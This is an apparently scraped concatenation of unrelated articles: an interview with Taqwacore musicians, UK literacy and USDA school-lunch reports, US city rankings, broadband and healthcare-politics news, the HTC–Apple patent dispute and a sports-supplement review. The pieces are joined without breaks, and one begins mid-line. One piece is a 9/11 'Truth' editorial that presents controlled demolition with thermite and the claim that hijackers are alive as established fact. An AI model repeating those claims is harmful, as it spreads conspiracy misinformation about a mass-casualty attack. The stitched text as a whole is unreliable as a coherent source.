Pakistan is mostly a place for ballads , and bhangra .
Q : Assuming international impact , are we seeing transnational connections being made ?
For example , the UK Asian Underground , the US / Indian Asian Massive [ as the MIDIval PunditZ consider themselves to be part of Asian Massive ] , and the Indian Cyber Mehfil groups are all in communication with one another and often work together on projects .
Is there something similar with TQ emerging ?
BU : Not yet , just some contact with British Asian geezers like Asian Dub Foundation , Fun Da Mental and Alien Kulture .
There are Taqwacore groups in Scotland and London , but no one has contacted us to do a tour .
Most of them discourage us about setting foot in Bradford lest we become the biggest pariahs since Salman fucking Rushdie .
SK : See BU .
HR : Is n’t every good qalandar a pariah ?
BU : True .
Q : Much is being made of TQ , but heavy metal , if not punk , have been a part of the musical politics of the Arab World for some time ( for example , see here ) .
What is different about TQ that it is generating such interest ?
Is it their origin is in the “ West ? ” Is it South Asian ?
BU : It ’s the West .
The media is having a circle jerk over this idea at the time , because the notion of “ Muslim punk ” is sexy to them .
The way the racist media sees it , they can put MMK in every story as the great white grandfather to this scene of confused , destructive Muslims who ’ve turned around from their ‘ opressive ’ culture .
There ’s plenty of revolutionary South Asian hip - hop out there .
Humble the Poet ’s father is a Sikh cab driver , and he writes about working - class life in Toronto , and remembering the 1984 golden temple massacre in India .
But instead , CBC TV , the biggest broadcaster in Canada comes to us to cover us .
The reason ?
A white man started all of it .
At the same time , the music has been the most underserviced aspect of all the media on us .
News stories mention the same songs , and make no note of what they sounds like .
They still leave Arjun out of their writeups because he has a Hindu name , and Shahjehan Khan , our guitarist , is constantly referred to as our lead singer .
KF : In response to BU : I think the best approach for getting lost in the message and media circus surrounding Islam is to look at Taqwacore objectively as traditional news does .
And many journalists do , usually getting tripped up on the exotica of talking about religion in a public way .
This is n’t just a Taqwacore - specific issue , or even one with Islam , but also one of those longstanding ethical dilemmas for reporters and editors — one that makes traditional journalists crazy private about debating the issue and expect to keep doing so until the end of time .
Punks and journalists have one similarity in that they are careful outside their respective circles not to lose the reputation and influence they ’ve earned .
So , there ’s a mutual attraction and tension in Taqwacore coverage that leads to what Basim called a circle jerk .
SK : [ Essentially ] the same story has been circulating for a while , and it is up to us to change it now , to be responsible with this media attention .
I think that the next year will be the true test of what TQ is really all about ( if anything more than a group of friends ) .
One would hope that more bands are started , I think we would all agree on that .
HR : There seems to be a long history of immigrant South Asians writing resistive poetry in the US and England .
As you point out , this poetry gets very little attention .
Do you really think it ’s about MMK ?
I do notice he gets mentioned a lot in articles about the Kominas , but all of you associate together quite a bit .
Although I am conscious of the myth of a “ white savior ” in a lot of redemption narrative , what makes you think it ’s not an two - fer for the reporter ?
You are with MMK , so she gets to write about you and him .
BU : It ’s likely a two - fer as well .
I ’m grateful for the association — though the scene , and the people who attend the concerts should be covered more heavily .
Q : What is the gender dynamic of TQ ?
Much is made of Secret Trial Five to show the gender openness of TQ , but punk is a strongly gendered - biased genre .
Is TQ inheriting the liabilities of punk and patriarchal interpretations of Islam ?
BU : Yes .
Girls come to watch the bands but do n’t play in them .
It ’s too bad .
SK : I do n’t think it has much to do with “ patriarchal interpretations of Islam , ” more just the ‘ reality on the ground ’ if you will .
We have a very sizeable female presence at our shows , but as to why there are n’t more bands , I do n’t know …
It ’s only really been 3 - 4 years !
I would be willing to bet that there are more out there that do n’t care to publicize themselves in the way that perhaps we have .
KF : I ’d agree with SK that there are more Taqwacore artists who are women out there .
There ’s a couple in Australia , for example .
You just have to look for them because as Shahj said , they ’re not talking about Taqwacore all the time .
Then you also have artists like Micropixie who are part of the scene even if they do n’t exactly label themselves Taqwacore .
HR : SK , my concern is that without pushing the gendered divisions early Taqwacore can inherit a lot of cultural baggage that quickly comes to define the system .
Q : In the MSM , TQ is often positioned as “ Islamic Punk , ” or “ Muslim Punk . ”
While members of TQ groups are from Muslim backgrounds , are these useful labels ?
Is the music Islamic or Islamicate ?
Does the distinction mean anything ?
That is , does their religious identification become their identity , regardless of their own feelings on the matter ?
If so , why does hip - hop not get the same treatment , which also emerges from an Islamicate background ?
BU : “ Muslim Punk ” is an awful term .
I do n’t believe in an afterlife , or any existance after you breathe your last breath .
I think the Qur’an is man-made .
But I think all art is divine , and that we men have invented these gods and written all these books .
In our lyrics , there is a lot of what could be considered blasphemous content .
That ’s because we own these gods .
We are these gods .
That is what taqwacore is for me .
It ’s self - consciousness .
It ’s knowledge of self .
SK : One ca n’t get deny
The Taqwacores being a novel about “ Muslim Punks . ”
In the first years of the Kominas , Islam was something that we felt like writing about , but so was a Pakistani earthquake ( Rabyah ) , or a Bollywood - style train robbery ( Dishoom Bebe ) .
I think that the term “ Muslim Punk ” may have been accurate initially ( I would disagree with BU ’s characterization as ‘ awful ’ , seeing as we all used / abused the term to some degree ) , but has become more of a burden as time has gone on .
Any label is usually exclusionary , and artists usually hate them .
I most certainly believe in an afterlife , and would call myself a Muslim .
HR : This question of blasphemous content is so interesting , because there is such a long history of these types of lyrics and approaches in Islamicate literature .
Iqbal ’s Jawab-e Shikwa , while not as direct as some of your lyrics , speaks in the voice of God .
That ’s blasphemy .
The literature of the malamati , the Sufis who sought blame for themselves , is all blasphemous .
It is very much part of the tradition , although the form may change .
I ’m not sure blasphemous content , from a devotional perspective , is really meaningful anymore .
It is most assuredly not a marker of belief .
However , your declaration of ( un ) belief is far more important , BU and SK .
BU : I think its fair to say we draw from poetry by Bulleh Shah , Waris Shah , and the Qur’an .
There ’s a lot of lyrics and music that appeal to me though .

' Too many ' cannot read and write
The report highlights that too few prisoners are learning basic skills An " unacceptably " high number of people in England cannot read , write and count properly , MPs have warned .
The Public Accounts Committee said in 2007 51,000 pupils left school without a GCSE of at least D - G in maths and 39,000 left without this in English .
The report into adult literacy and numeracy also warned that only one in five offenders with poor basic skills had enrolled on a course to help them .
Ministers said no other government had invested so much in basic skills .
The committee of MPs said a lack of up - to - date information about skills meant the government could not be sure its schemes to improve basic skills were working .
This is a dismal picture
Edward Leigh , PAC chairman
Read your stories Chairman of the PAC Edward Leigh said anyone who believed the government could meet its target of 95 % adult literacy and numeracy by 2020 was " living in cloud cuckooland " .
" Whilst they have made some progress , I do n't think there 's the remotest chance they will reach that , " he told the BBC .
Even doing so would only bring England to the level currently achieved by the top 25 % of the Organisation for Economic Co-operation and Development ( OECD ) countries , the PAC added .
Tackling poor literacy and numeracy skills was essential if more people were to realise their full potential and England was to remain competitive in the global economy , the report concluded .
The committee called for better efforts to recruit numeracy teachers and urged the government to do more to encourage public services , such as health and housing , to promote training opportunities .
The Prison Service could play a vital role in helping offenders , the committee said .
We have revolutionised the way in which basic skills are dealt with
Further education minister Sion Simon Mr Leigh said : " This is a dismal picture , both for the many who face diminished prospects in what they can achieve in life and for the competitiveness of our country in the world economy .
" It 's down to teaching .
As a country , we 've got to accept that since the 1960s we have performed woefully in international league tables .
" We 've got to accept there 's something wrong with our teaching . "
Further education minister Sion Simon said no government had done more to further the nation 's literacy and numeracy skills .
" We have revolutionised the way in which basic skills are dealt with , and through the Skills for Life strategy , have helped more than 5.7 million adults to improve their numeracy and literacy skills .
' Too little known ' " Last year we launched a national high - profile numeracy ad campaign , ' Get On ' , to increase demand , and we are recruiting more high quality numeracy teachers .
We have committed a further £ 3.9bn to Skills for Life through to 2011 . "
He said that since 2001 , more than 2.8 million people had achieved Skills for Life qualifications .
A new survey of that scheme would be commissioned next year , he added .
Barry Sheerman , chairman of the Commons ' schools select committee , criticised the PAC report saying it was a " thin piece of work " , based on little evidence .
The Labour MP said : " To make sweeping generalisations about adult literacy and numeracy does a disservice to everyone , learners and teachers across the country " .
The new survey was welcomed by Professor Greg Brooks from Sheffield University 's School of Education .
Professor Brooks , who has conducted research into approaches to adult learning , said too little was known about what works to improve adult skills .
" We need to have more precisely focused investigation of the specific teaching methods which hold out the promise of better progress for learners , " he said .

Cleveland has won the dubious distinction of being named the most miserable city in the United States , according to a new poll .
The Ohio city on the Cuyahoga River has high unemployment , dismal weather , hefty taxes , corruption and mediocre sports teams , all of which have propelled it to the number one position in the Forbes.com list .
" Cleveland nabbed the top spot as a result of poor ratings across the board .
It was the only city that fell in the bottom half of rankings in all nine categories , " Forbes said on its website .
" The city has been dubbed with a less than endearing nickname : the Mistake by the Lake , " it added .
The rankings are based on jobless rates , inflation , taxes , commuting times , crime rates , performance by the city 's sports teams , weather , pollution and corruption by public officials .
The economic downturn with high unemployment , foreclosures and bankruptcies hit cities across the United States last year , particularly in the mid-west section of the country .
Crime and unemployment secured the number two spot for Stockton , which held the top position in last year 's ranking .
Memphis captured third place thanks to its violent crime rate and the number of convicted officials , while the ailing auto industry drove the Michigan cities of Detroit and Flint into the top five .
" It [ the list ] is dominated by Midwestern cities that formerly had large manufacturing bases , " said Kurt Badenhausen of Forbes .
" A lot of the cities that showed up on our list are going through hard times right now , dealing with high unemployment , with declining manufacturing bases .
Many have experienced strong net migrations out of the city over the last 20 and 30 years . "
Despite its enviable weather , Miami scored in the bottom 10 per cent in commuting time , corruption and violent crime which sent it into sixth place .
It also had the 10th worst foreclosure rate in the US last year at 7.2 per cent .
" One of the biggest surprises is Miami .
The good weather and no state income taxes blur some of the severe problems that Miami has related to crime and corruption , as well as long commutes , " Mr Badenhausen added .
The Florida sunshine mecca was followed in the miserable ranking by St Louis , Buffalo , Canton , Ohio and Chicago , which has the country 's highest sales tax at 10.25 per cent .
New York , the nation 's biggest city , is rich in culture but its lengthy commuting times and high income taxes pushed it into 16th place .

The U.S. Department of Agriculture announced sweeping steps Thursday to " assure the safety and quality of food " purchased for the National School Lunch Program .
The measures include tightening requirements on companies that supply ground beef to schools , testing the beef more often and more thoroughly , and improving communications within the USDA to " identify potential food safety issues " before children get sick .
The initiatives come in the wake of a USA TODAY investigation that revealed failures in government programs intended to protect students from food - borne illnesses .
More than 31 million children participate in the school lunch program .
MORE : Complete coverage of school lunch safety INTERACTIVE :
Who qualifies for free / reduced lunch
The newspaper found that McDonald 's and other fast - food chains are far more rigorous than the government in checking for bacteria and dangerous pathogens in beef .
USA TODAY also found that the government lacks ways to quickly alert schools when products have been recalled or implicated in safety investigations .
The measures outlined Thursday are intended to address each of those points , bringing the standards and testing protocols in line with those used by the most selective restaurants and retailers .
" It 's a big deal , " food safety consultant David Theno said of the USDA measures .
He said the moves will push companies to " play to a higher standard " if they want to continue to supply food to schools .
The USDA also pledged to review the safety records of its school lunch suppliers more carefully and bar companies that have had repeated problems with their commercial products .
Such a move could affect companies such as Beef Packers , a Fresno company that recalled 826,000 pounds of ground beef last summer because it contained a drug - resistant strain of salmonella .
Public health officials warned consumers to discard products from the company , which had a history of salmonella problems , but USA TODAY found that the USDA paid Beef Packers hundreds of thousands of dollars for 450,000 pounds of ground beef made during the period covered by the commercial recall .
Rep. George Miller , D - Calif. , praised the announcement .
Miller , who chairs the House Committee on Education and Labor , asked the USDA last month to enlist the National Academy of Sciences in a food - safety review — a move the USDA also announced Thursday .
Miller called the USDA announcement " a meaningful step " in improving the school lunch program .

We 've heard a lot about how the Federal Communications Commission 's national broadband plan aims to provide 100 million U.S. households with 100 M bps broadband connections so far , but precious little on how it could affect corporate users .
Who else wants national broadband ?
There is a good reason for this since the newly - unveiled plan is primarily focusing on boosting broadband adoption and quality in the consumer market .
But while there is n't any direct plan to boost enterprise IT networks , businesses may find themselves benefitting indirectly from a lot of the proposed policies in the plan .
The most obvious example of this comes from the fact that increased broadband speeds and deployment will increase workers ' ability to effectively telecommute .
In addition to proposing spending $ 15.5 billion for new broadband deployment , the FCC has also vowed to free up 500MHz of spectrum to use for wireless broadband networks .
Taken together , these two proposals could make faster broadband available in virtually every area of the United States .
" In a recent survey we did , 84 % of enterprises said they were increasing telecommuting , " says Nemertes Research President Johna Till Johnson .
" If that happens then one of benefits to enterprises is that they can count on having a much broader pipe available to their employees . "
Gartner analyst Alex Winogradoff also sees increased capacity and access for telecommuters as one of the primary enterprise benefits of the broadband plan .
In particular , he says that workers living in rural areas would no longer have to commute long distances for meetings if they can attend them more easily through high - quality video conferencing .
" The ancillary benefits of this plan will let more people work at home , " he says .
" The ability for you to have access to more locations in rural areas rather than just cities will help from an enterprise standpoint . "
Artwork : Chip Taylor Dan Hays , the director and head of the telecom practice at global management consulting firm PRTM , says that enterprises will also benefit from tangentially from FCC initiatives to implement broadband more aggressively in healthcare and in energy grids , since increased technological efficiency in those industries should help hold down health and energy costs for businesses .
Additionally , he says that the increased broadband speeds the plan envisions will give businesses more bang for their bucks on broadband connectivity .
" If you look at the plan released this week , it does n't really focus on the needs of enterprises , " he says .
" But there are a large number of ancillary benefits that enterprises will see if the aspirations of the plan are achieved . "

While serving out a hit piece against the global “ 9/11 Truth ” movement , it is in fact the editors of the Washington Post who are demonstrably “ fact - averse ” .
An editorial in the Washington Post yesterday slammed Japanese member of parliament Yukihisa Fujita because he “ seems to think that America ’s rendering of the events of Sept. 11 , 2001 , is a gigantic hoax . ”
His “ ideas ” about the terrorist attacks “ are too bizarre , half - baked and intellectually bogus to merit serious discussion . ”
Fujita , the editorial added , is a member of “ the lunatic fringe ” who “ have spawned a thriving subculture of conspiracy theorists at home and abroad ” , and “ his views , rooted as they are in profound distrust of the United States , seem to reflect a strain of anti-American thought ” .
The piece closes by suggesting that the “ fact - averse ” Fujita should be removed from office .
Among Fujita ’s “ bizarre ” views are “ that shadowy forces with advance knowledge of the plot played the stock market to profit from it ” , “ the fantastic idea that eight of the 19 hijackers are alive and well ” , and “ that controlled demolition rather than fire or debris may be a more likely explanation for at least the collapse of the building at 7 World Trade Center ” .
Yet while serving out a hit piece against the global “ 9/11 Truth ” movement , it is in fact the editors of the Washington Post who are demonstrably “ fact - averse ” .
It happens to be an uncontroversial fact that in the days just prior to the attacks , there was a dramatic increase in trade on put options , and what made this unusual spike even more mysterious was that it was observed only in relation to companies directly affected by the attacks , including United Airlines , American Airlines , and Morgan Stanely Dean Witter & Co. ( which occupied 22 floors of 2 World Trade Center ) .
That this occurred was in fact mentioned in the 9/11 Commission Report , which reported that the federal investigations into the suspicious trading concluded that it was all “ innocuous ” .
Many of the trades on the airline companies , for instance , were traced to a “ single U.S. - based institutional investor with no conceivable ties to al Qaeda ” .
In other words , the report acknowledges that the suspicious trades did in fact occur , but dismisses this as evidence of foreknowledge because the investigation did n’t lead to the proper predetermined culprits .
This is illustrative of the kind of standard the 9/11 Commission employed throughout its so - called “ investigation ” .
The “ fantastic ” idea that the identity of the hijackers named by the FBI is in question is an interesting case .
At the time , the Washington Post had also subscribed to this “ half - baked ” notion .
On September 20 , 2001 , under the headline “ Some Hijackers ’ Identities Uncertain ” , the Post reported , “ FBI officials said yesterday that some of the 19 terrorists who carried out last week ’s assault on New York and Washington may have stolen the identities of other people , and their real names may remain unknown . ”
Among the evidence for this , the Post cited “ Saudi government officials ” as having determined “ that at least two of the terrorists used the names of living , law - abiding Saudi citizens ” .
The man in the picture of one of the alleged hijackers , the Post reported , was Salem Al - Hazmi , who was actually alive and well , according to Gaafar Allagany , the chief of the Saudi Embassy ’s information office in Washington .
The real Al - Hazmi’s “ passport was stolen by a pickpocket on a trip to Cairo three years ” before .
Another of the alleged hijackers was Abdulaziz Al - Omari , who , Allagany said , was also alive and “ an electrical engineer in Saudi Arabia . ”
“ The uncertainty ” , the Post continued , “ highlights how difficult it may be to ever identify some of the hijackers who participated in the deadliest act of violence on American soil .
Most of the hijackers ’ bodies were obliterated in the fiery crashes . ”
The Washington Post was not the only mainstream media outlet to report on the uncertainty over the hijacker ’s identities .
It was widely reported elsewhere , both in the U.S. and international media .
The U.K. ’s Guardian , for instance , reported on September 21 under the headline “ False identities mislead FBI ” that “ The FBI acknowledged yesterday that some of the terrorists involved in the attacks last week were using false identities ” , with regard to Al - Hazmi and Al - Omari .
FBI acknowledgment of this was also reported by the BBC the same day under the headline “ FBI probes hijackers ’ identities ” .
The BBC also reported on September 22 under the headline “ Hijack ‘ suspect ’ alive in Morocco ” that Waleed Al - Shehri , another alleged hijacker , the “ same Mr Al - Shahri ” whose photo the FBI had released as being among the terrorists , “ has turned up in Morocco , proving clearly that he was not a member of the suicide attack . ”
On September 23 , under the headline “ Hijack ‘ suspects ’ alive and well ” , the BBC reported that yet “ Another of the men named by the FBI as a hijacker … has turned up alive and well ” and that “ The identities of four of the 19 suspects … are now in doubt . ”
FBI Director Robert Mueller also “ acknowledged … that the identity of several of the suicide hijackers is in doubt . ”
The London Telegraph similarly ran a story on September 23 entitled “ Revealed : the men with stolen identities ” .
The Washington Post itself ran a follow - up article on September 25 entitled “ Some Light Shed On Saudi Suspects ” , reporting that “ U.S. investigators believe they have positively identified 15 of the 19 hijackers ” , but that the identities of the other four were still in question .
On September 27 , even while releasing the official list of hijackers along with their photos , the FBI confirmed that uncertainty remained over some of the identities .
Mueller acknowledged that the FBI was still “ determining whether when these individuals came to the United States these were their real names , or they changed their names for use with false identification in the United States ; that false identification being used up to and on the day of September 11th , and that false identification used to purchase the tickets , and thereby being the name on the manifests of the planes that went down . ”
Yet , despite these facts , neither the Washington Post nor any other mainstream media outlet has ever offered any follow - up reports explaining whether and how this uncertainty was finally resolved .
The FBI has never clarified this matter to the public .
The 9/11 Commission did n’t so much as even address the question , even to attempt to clear up the matter .
And so , it remains an uncontroversial fact , as far as the public is concerned , that the identify of at least several of the hijackers remains in question .
Why the government has refused to clarify this issue , and why the media now report anyone who does n’t have a short memory about 9/11 as being part of a “ lunatic fringe ” are also open questions that warrant some kind of explanation .
Finally , there is the matter of the collapse of the World Trade Center buildings .
Many people might be surprised to learn that not only two towers fell on September 11 .
In fact , a third skyscraper also collapsed that day neatly into its own footprint .
It is also an uncontroversial fact that proper investigative procedures for such disasters , particularly in cases where a crime has been committed , were contemptuously ignored in the case of the WTC .
For starters , the evidence from the crime scene in the form of the remains of the three buildings was removed and immediately destroyed .
Destruction of evidence is itself a crime , and yet that is what happened .
Other standard procedures were also ignored , such as testing for any kinds of accelerants that may have been responsible for the building failures .
The National Institute of Standards and Technology ( NIST ) has released what is supposed to be the conclusive report on the building collapses .
Yet , the explanation it provides , too , is inadequate , to say the least .
The computer models NIST offers for the collapse of WTC 7 , for instance , look just like one would expect them to , for the kind of collapse NIST says occurred there .
You first see one load - bearing column fail , leading to the progressive failure of other columns until the entire structure has eventually crumbled .
The problem is that these models look absolutely nothing like the actual collapse , documented on video .
A simple look at any available footage of the collapse is enough to demonstrate that all major load - bearing columns of the building failed nearly simultaneously .
You see the penthouse of the building sinking into the core just seconds before the entire structure , all perimeter columns , fail at precisely the same instant , causing the building to collapse straight down at free - fall acceleration into what should have been the path of greatest resistance according to NIST ’s own assessment .
The similarities to videos of building “ implosions ” under controlled demolition are astonishing .
Yet NIST dismisses the possibility that charges could have been used largely on the basis that , if this had been the case , there would have been eyewitness reports of the explosions .
The problem with this is that there were in fact a great many eyewitness reports of explosions , both prior to and during the collapse .
NIST also completely ignored the actual leading alternative hypothesis , which was that a substance called thermite ( or its U.S. Department of Defense - patented variation , thermate ) may have been used to cut the building ’s columns , rather than , or in conjunction with , traditional explosive demolitions .
Evidence for this hypothesis comes not only in form of empirical observation about the actual nature of the collapse from video footage ( including the presence of molten steel ) , but also in traces of what appears to be thermite in the dust from the collapses .
Independent scientific inquiries into the collapse have led to the discovery of “ distinctive red / gray chips in all of the samples ” that , when studied , all showed “ marked similarities ” and were “ found to be an unreacted thermitic material ” .
These findings were included in a report entitled , “ Active Thermitic Material Discovered in Dust from the 9/11 World Trade Center Catastrophe ” that was published last year in The Open Chemical Physics Journal .
Though this report was widely circulated on the internet and among alternative media sources , the Washington Post never bothered to report these findings published in a peer - reviewed scientific journal .
Whatever theories about the events of September 11 , 2001 one may subscribe to , what everyone surely can agree upon is that the facts should matter .
The editors of the Washington Post might perhaps begin by acknowledging just a few of the more non-controversial facts , including the fact that suspicious trading did occur prior to 9/11 , the fact that the identities of at least some of the hijackers has been cast in doubt and that this has never been clarified to the public , and the fact that the collapses of the three WTC buildings has never been adequately investigated .
Surely , that proper credible investigations into the events of 9/11 should occur — indeed , should have occurred long ago — should also be non-controversial , no matter which conspiracy theory one believes , whether it belongs to “ the lunatic fringe ” or to the U.S. government .
WASHINGTON / CHICAGO ( Reuters ) -
As the Congress once again rallies to pass healthcare reform legislation , momentum is growing in many states to pass laws to block the changes -- a move that could lead to a legal battle over states ’ sovereignty .
President Obama greets members of the audience after delivering remarks on health insurance reform at George Mason University 's Patriot Center in Fairfax , Virginia , March 19 , 2010 .

Bills and resolutions have been introduced in at least 36 state legislatures seeking to limit or oppose various aspects of the reform plan through laws or state constitutional amendments , according to the National Conference of State Legislatures .
“ There ’s going to be a big free - for - all lawsuit about this , ” said Michael Bird , legislative counsel for the NCSL .
The House of Representatives is to due vote on Sunday on a sweeping healthcare overhaul that would require all Americans to have health insurance , but would give subsidies to help low - and middle - income workers .
It would also ban insurance practices like refusing coverage to those with pre-existing medical conditions .
Opposition efforts at the state level “ in general ... seek to make or keep health insurance optional , and allow people to purchase any type of coverage they may choose , ” the NCSL said .
Democratic House leaders on Friday voiced growing confidence of winning a close vote .
If the bill passes the House , it would then only have to pass the Senate by a simple majority under the planned procedure on the legislation .
Mirroring the partisan politics that have dogged the federal legislation , state measures to block healthcare reform are more likely to arise and succeed in states where Republicans control at least one legislative chamber and the governor ’s office .
So far , only two states , Idaho and Virginia , have enacted laws , while an Arizona constitutional amendment is seeking voter approval on the November ballot .
No anti-health care reform legislation has emerged in Democrat - dominated states like Illinois and New York , according to the NCSL .
Idaho Governor C.L. “ Butch ” Otter signed a bill on Wednesday allowing the state ’s attorney general to file a lawsuit opposing federal healthcare legislation requiring individuals to buy medical insurance .
Otter sees federal legislation as overreaching and bound to add to medical expenses of state governments , spokesman Jon Hanian said .
“ He ’s concerned we ca n’t afford it , ” Hanian said , adding that Otter , a Republican , is disappointed in how the Democrat - led U.S. Congress is handling the legislation .
White House spokesman Robert Gibbs on Thursday dismissed as political positioning the complaints by states that the healthcare overhaul may endanger their independence or be too costly .
In the latest version of the bill , all states would receive extra funding to cover Medicaid costs that are expected to rise under the reform , including 100 percent federal coverage for new enrollees under the plan through 2016 .
Medicaid is the healthcare program for the poor jointly administered by the states and federal government .
Still , states are concerned that the burden of providing healthcare will fall to them without enough federal support and that the reforms infringe on their powers under the U.S. Constitution ’s Bill of Rights .
For example , Texas Governor Rick Perry , a Republican , says the proposal will double the number of Medicaid recipients in his state and cost an additional $ 24.3 billion over the next decade .
TENTH AMENDMENT ARGUMENT
Many states cite the 10th Amendment , which says “ powers not delegated to the United States by the Constitution , nor prohibited by it to the states , are reserved to the states , ” as proof that the U.S. government cannot set their healthcare laws .
Gibbs did not accept that complaint .
“ What we ’re about to pass and sign into law will meet Constitutional muster , ” he said .
Robert Natelson , a constitutional law professor at the University of Montana School of Law , said it would be easier for states to argue for standing to file a lawsuit that claims the federal government has overstepped its constitutional powers .
“ The legal question is , Does this health care bill exceed the federal government ’s powers or it is invalid for other reasons ? ” he said .
Michael Boldin , founder of the Tenth Amendment Center , a think - tank on the relationships of the states and federal government , pointed to previous state movements to nullify federal laws in areas such as medical marijuana and Real ID , a federal standard for driving licenses .
In the case of marijuana , Boldin said 14 states allow its use for medical purposes despite a prohibition in federal law that has been upheld by the U.S. Supreme Court .
A similar situation may arise with healthcare reform , where there could be mass noncompliance with the law without any real consequences , Boldin said .
HTC to Apple : We Built a Touchscreen Phone Before You Did
The surprise HTC expressed earlier this month at being sued by Apple has finally turned into something a bit more substantial : “ strong disagreement . ”
The company issued a statement this morning denying Apple ’s allegations and vowed to fight the lawsuit .
The gist : HTC has been making phones far longer than Apple , including a touchscreen device called the XDA ( right ) that predates the iPhone by about five years .
“ HTC disagrees with Apple ’s actions and will fully defend itself .
HTC strongly advocates intellectual property protection and will continue to respect other innovators and their technologies as we have always done , but we will continue to embrace competition through our own innovation as a healthy way for consumers to get the best mobile experience possible , ” HTC CEO Peter Chou said in the statement .
“ From day one , HTC has focused on creating cutting - edge innovations that deliver unique value for people looking for a smartphone , ” Chou continued .
“ In 1999 we started designing the XDA and T - Mobile Pocket PC Phone Edition , our first touch - screen smartphones , and they both shipped in 2002 with more than 50 additional HTC smartphone models shipping since then . ”
The statement continues with a list of HTC ’s technological firsts :
First Windows PDA ( 1998 )
First Windows Phone ( June 2002 )
First 3G CDMA EVDO smartphone ( October 2005 )
First gesture - based smartphone ( June 2007 )
First Google ( GOOG ) Android smartphone ( October 2008 )
First 4G WiMax smartphone ( November 2008 )
The implication here seems to be that these “ firsts ” somehow negate Apple ’s ( AAPL ) claim that the company violated 20 of its patents .
And while it ’s certainly possible that this is the case , it ’s hard to accept HTC ’s argument without a list of patents to back it up .
Harder still when HTC says nothing about its legal strategy for dealing with Apple ’s assault .
Does HTC plan to countersue ?
Does the company have IP of its own with which to mount a defense ?
Or will it simply take Apple to the mat with its “ strong disagreement ” and toothless positioning statements like the one above ?
Interesting to contrast HTC ’s response to the Apple ’s suit to Palm ’s ( PALM ) immediate and aggressive riposte to Apple COO Tim Cook ’s comments about companies that infringe on its iPhone intellectual property :
“ Palm has a long history of innovation that is reflected in our products and robust patent portfolio , and we have long been recognized for our fundamental patents in the mobile space .
If faced with legal action , we are confident that we have the tools necessary to defend ourselves . ”
UPDATE : In an interview with Reuters , Jason Mackenzie , vice president for HTC’s U.S. business , said HTC plans to issue a formal response to Apple ’s claims in a matter of weeks .
He did not say what form that response will take .
Most of the work we do with athletes regarding sports nutrition is to teach them and their coaches how to structure their diet and time food intake to optimize performance and recovery .
Dietary supplements can play a meaningful role in helping athletes consume the proper amount of calories , carbohydrate , and protein in their diet .
However , they should be viewed as supplements to the diet , not replacements for a good diet .
While it is true that most dietary supplements available for athletes have little scientific data supporting their potential role to enhance training and / or performance , it is also true that a number of nutrients and / or dietary supplements have been shown to help improve performance and / or recovery .
Supplementation with these nutrients can help augment the normal diet to help optimize performance .
Sports nutrition specialists must be aware of the current data regarding nutrition , exercise , and performance and be honest about educating their clients about results of various studies ( whether pro or con ) .
With the proliferation of information available about nutritional supplements to the consumer , the sports nutrition specialist , nutritionist , and nutrition industry lose credibility when they do not accurately describe results of various studies to the public .
The following outlines several classifications of nutritional supplements that are often taken by athletes and categorizes them into ' apparently effective ' , ' possibly effective ' , ' too early to tell ' , and ' apparently ineffective ' supplements based on interpretation of the literature .
It should be noted that this analysis focuses primarily on whether the proposed nutrient has been found to affect exercise and / or training adaptations based on the current available literature .
Additional research may or may not reveal ergogenic value , possibly altering its classification .
It should be also noted that although there may be little ergogenic value to some nutrients , there may be some potential health benefits that may be helpful for some populations .
Therefore , just because a nutrient does not appear to affect performance and / or training adaptations , that does not mean it does not have possible health benefits for athletes .
Convenience Supplements
Convenience supplements are meal replacement powders ( MRP's ) , ready to drink supplements ( RTD's ) , energy bars , and energy gels .
They currently represent the largest segment of the dietary supplement industry representing 50 - 75 % of most company 's sales .
They are typically fortified with vitamins and minerals and differ on the amount of carbohydrate , protein , and / or fat they contain .
They may also vary based whether they are fortified with various nutrients purported to promote weight gain , enhance weight loss , and / or improve performance .
Most people view these supplements as a nutrient dense snack and / or use them to help control caloric intake when trying to gain and / or lose weight .
In our view , MRP's , RTD's , and energy bars / gels can provide a convenient way for people to meet specific dietary needs and / or serve as good alternatives to fast food other foods of lower nutritional value .
Use of these types of products can be particularly helpful in providing carbohydrate , protein , and other nutrients prior to and / or following exercise in an attempt to optimize nutrient intake when an athlete does n't have time to sit down for a good meal or wants to minimize food volume .
However , they should be used to improve dietary availability of macronutrients - not as a replacement for a good diet .
Care should also be taken to make sure they do not contain any banned or prohibited nutrients .
Muscle Building Supplements
The following provides an analysis of the literature regarding purported weight gain supplements and our general interpretation of how they should be categorized based on this information .
Table 3 summarizes how we currently classify the ergogenic value of a number of purported performance - enhancing , muscle building , and fat loss supplements based on an analysis of the available scientific evidence .
Table 3 Summary of categorization of dietary supplements based on available literature .

Apparently Effective
Weight Gain Powders
One of the most common means athletes have employed to increase muscle mass is to add extra calories to the diet .
Most athletes " bulk up " in this manner by consuming extra food and / or weight gain powders .
In order to increase skeletal muscle mass , there must be adequate energy intake ( anabolic reactions are endergonic and therefore require adequate energy intake ) .
Studies have consistently shown that simply adding an extra 500 - 1,000 calories per day to your diet in conjunction with resistance training will promote weight gain [ 31 , 33 ] .
However , only about 30 - 50 % of the weight gained on high calorie diets is muscle while the remaining amount of weight gained is fat .
Consequently , increasing muscle mass by ingesting a high calorie diet can help build muscle but the accompanying increase in body fat may not be desirable for everyone .
Therefore , we typically do not recommend this type of weight gain approach [ 39 ] .
Creatine monohydrate
In our view , the most effective nutritional supplement available to athletes to increase high intensity exercise capacity and muscle mass during training is creatine monohydrate .
Numerous studies have indicated that creatine supplementation increases body mass and / or muscle mass during training [ 70 ]
Gains are typically 2 - 5 pounds greater than controls during 4 - 12 weeks of training [ 71 ] .
The gains in muscle mass appear to be a result of an improved ability to perform high intensity exercise enabling an athlete to train harder and thereby promote greater training adaptations and muscle hypertrophy [ 72 –75 ] .
The only clinically significant side effect occasionally reported from creatine monohydrate supplementation has been the potential for weight gain [ 71 , 76–78 ]
Although concerns have been raised about the safety and possible side effects of creatine supplementation [ 79 , 80 ] , recent long - term safety studies have reported no apparent side effects [ 78 , 81 , 82 ] and / or that creatine monohydrate may lessen the incidence of injury during training [ 83 – 85 ] .
Additionally a recent review was published which addresses some of the concerns and myths surrounding creatine monohydrate supplementation [ 86 ] .
Consequently , supplementing the diet with creatine monohydrate and / or creatine containing formulations seems to be a safe and effective method to increase muscle mass .
The ISSN position stand on creatine monohydrate [ 87 ] summarizes their findings as this :
1. Creatine monohydrate is the most effective ergogenic nutritional supplement currently available to athletes in terms of increasing high - intensity exercise capacity and lean body mass during training .
2 . Creatine monohydrate supplementation is not only safe , but possibly beneficial in regard to preventing injury and / or management of select medical conditions when taken within recommended guidelines .
